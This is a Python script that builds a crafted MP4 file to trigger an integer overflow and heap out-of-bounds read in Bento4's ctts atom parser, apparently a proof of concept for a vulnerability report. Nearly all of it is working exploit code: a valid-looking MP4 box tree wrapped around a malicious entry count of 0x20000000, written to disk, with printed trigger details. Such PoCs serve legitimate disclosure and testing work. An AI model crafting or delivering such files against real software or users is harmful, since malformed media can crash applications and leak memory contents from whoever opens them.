#!/usr/bin/env python3
"""
vuln_001_gen.py - PoC generator for AP4_CttsAtom integer overflow in Bento4

Vulnerability:
  AP4_CttsAtom::AP4_CttsAtom() reads entry_count from stream without bounds
  checking. With entry_count=0x20000000:
    - entry_count * 8 = 0x100000000 overflows to 0 on 32-bit arithmetic
    - new unsigned char[0] allocates a 0-byte buffer
    - stream.Read(buffer, 0) reads nothing
    - The for loop then accesses buffer[i*8] for i in [0, 0x1FFFFFFF],
      causing heap buffer over-read (OOB read)
    - m_Entries.SetItemCount(0x20000000) may also trigger OOM/NULL deref

CWE: CWE-190 (Integer Overflow) -> CWE-125 (Out-of-Bounds Read)
"""
import struct
import os
import sys

def make_box(box_type, data):
    """Create a basic box: size(4BE) + type(4) + data."""
    size = 8 + len(data)
    return struct.pack('>I', size) + box_type + data

def make_full_box(box_type, version, flags, data):
    """Create a full box: size(4BE) + type(4) + version(1) + flags(3BE) + data."""
    ver_flags = struct.pack('>I', (version << 24) | (flags & 0xFFFFFF))
    payload = ver_flags + data
    size = 8 + len(payload)
    return struct.pack('>I', size) + box_type + payload

# ---------------------------------------------------------------------------
# ftyp box
# ---------------------------------------------------------------------------
ftyp_data = (
    b'isom'                    # major brand
    + struct.pack('>I', 0)     # minor version
    + b'isom'                  # compatible brand 1
    + b'iso2'                  # compatible brand 2
    + b'mp41'                  # compatible brand 3
)
ftyp = make_box(b'ftyp', ftyp_data)

# ---------------------------------------------------------------------------
# stbl children
# ---------------------------------------------------------------------------

# stsd (sample description box) - 0 entries
stsd = make_full_box(b'stsd', 0, 0, struct.pack('>I', 0))

# stts (time-to-sample) - 0 entries
stts = make_full_box(b'stts', 0, 0, struct.pack('>I', 0))

# stsc (sample-to-chunk) - 0 entries
stsc = make_full_box(b'stsc', 0, 0, struct.pack('>I', 0))

# -------------------------------------------------------------------
# ctts (composition time offset) - MALICIOUS ATOM
# entry_count = 0x20000000
#   entry_count * 8 = 0x100000000 (overflows 32-bit to 0)
#   new unsigned char[0] -> 0-byte allocation
#   loop accesses buffer[i*8] up to i=0x1FFFFFFF -> heap OOB read
# Atom layout:
#   4B size | 4B 'ctts' | 1B version | 3B flags | 4B entry_count | 4B pad
# Total declared size = 4+4+4+4+4 = 20 bytes
# -------------------------------------------------------------------
CTTS_ENTRY_COUNT = 0x20000000
ctts_payload = struct.pack('>I', CTTS_ENTRY_COUNT)  # entry_count (4 bytes)
ctts_payload += b'\x00\x00\x00\x00'                  # 4-byte padding -> total size=20
ctts = make_full_box(b'ctts', 0, 0, ctts_payload)
assert len(ctts) == 20, f"ctts must be 20 bytes, got {len(ctts)}"

# stsz (sample size) - uniform size 0, 0 samples
stsz = make_full_box(b'stsz', 0, 0, struct.pack('>II', 0, 0))

# stco (chunk offset) - 0 entries
stco = make_full_box(b'stco', 0, 0, struct.pack('>I', 0))

# stbl container
stbl = make_box(b'stbl', stsd + stts + stsc + ctts + stsz + stco)

# ---------------------------------------------------------------------------
# minf children
# ---------------------------------------------------------------------------

# smhd (sound media header)
smhd = make_full_box(b'smhd', 0, 0, struct.pack('>HH', 0, 0))

# dinf / dref (data reference - self-contained url)
url_box = make_full_box(b'url ', 0, 0x000001, b'')   # flags=1 -> self-contained
dref = make_full_box(b'dref', 0, 0, struct.pack('>I', 1) + url_box)
dinf = make_box(b'dinf', dref)

# minf container
minf = make_box(b'minf', smhd + dinf + stbl)

# ---------------------------------------------------------------------------
# mdia children
# ---------------------------------------------------------------------------

# mdhd (media header)
mdhd_data = struct.pack('>IIII', 0, 0, 44100, 0)   # ctime, mtime, timescale, duration
mdhd_data += struct.pack('>HH', 0x15C7, 0)          # language='und', pre_defined=0
mdhd = make_full_box(b'mdhd', 0, 0, mdhd_data)

# hdlr (handler reference) - audio track
hdlr_data = (
    struct.pack('>I', 0)    # pre_defined
    + b'soun'               # handler_type
    + b'\x00' * 12          # reserved
    + b'\x00'               # null-terminated name (empty)
)
hdlr = make_full_box(b'hdlr', 0, 0, hdlr_data)

# mdia container
mdia = make_box(b'mdia', mdhd + hdlr + minf)

# ---------------------------------------------------------------------------
# trak children
# ---------------------------------------------------------------------------

# tkhd (track header)
# version=0: ctime(4)+mtime(4)+track_id(4)+reserved(4)+duration(4)
#            +reserved(8)+layer(2)+alt_group(2)+volume(2)+reserved(2)
#            +matrix(36)+width(4)+height(4) = 80 bytes payload
unity_matrix = struct.pack('>9I',
    0x00010000, 0, 0,
    0, 0x00010000, 0,
    0, 0, 0x40000000
)
tkhd_data = (
    struct.pack('>IIIII', 0, 0, 1, 0, 0)   # ctime, mtime, track_id, reserved, duration
    + b'\x00' * 8                            # reserved
    + struct.pack('>HHH', 0, 0, 0x0100)     # layer, alt_group, volume (1.0)
    + b'\x00' * 2                            # reserved
    + unity_matrix                           # matrix (36 bytes)
    + struct.pack('>II', 0, 0)              # width, height
)
tkhd = make_full_box(b'tkhd', 0, 3, tkhd_data)  # flags=3: track enabled + in movie

# trak container
trak = make_box(b'trak', tkhd + mdia)

# ---------------------------------------------------------------------------
# mvhd (movie header)
# ---------------------------------------------------------------------------
mvhd_data = (
    struct.pack('>IIIII', 0, 0, 1000, 0, 0x00010000)  # ctime, mtime, timescale, duration, rate(1.0)
    + struct.pack('>H', 0x0100)                          # volume (1.0)
    + b'\x00' * 10                                       # reserved
    + unity_matrix                                        # matrix (36 bytes)
    + b'\x00' * 24                                       # pre_defined
    + struct.pack('>I', 2)                               # next_track_ID
)
mvhd = make_full_box(b'mvhd', 0, 0, mvhd_data)

# ---------------------------------------------------------------------------
# moov container
# ---------------------------------------------------------------------------
moov = make_box(b'moov', mvhd + trak)

# ---------------------------------------------------------------------------
# Assemble and write
# ---------------------------------------------------------------------------
mp4_bytes = ftyp + moov

out_dir = os.path.dirname(os.path.abspath(__file__))
out_path = os.path.join(out_dir, 'vuln_001.mp4')

with open(out_path, 'wb') as f:
    f.write(mp4_bytes)

print(f"[+] Written {len(mp4_bytes)} bytes to {out_path}")
print(f"[+] ctts atom: size={len(ctts)}, type='ctts', version=0, flags=0, entry_count=0x{CTTS_ENTRY_COUNT:08X}")
print(f"[+] Overflow: entry_count*8 = 0x{(CTTS_ENTRY_COUNT * 8) & 0xFFFFFFFF:08X} (32-bit) -> 0-byte buffer allocation")
print("[+] Trigger: heap buffer over-read in AP4_CttsAtom constructor loop")
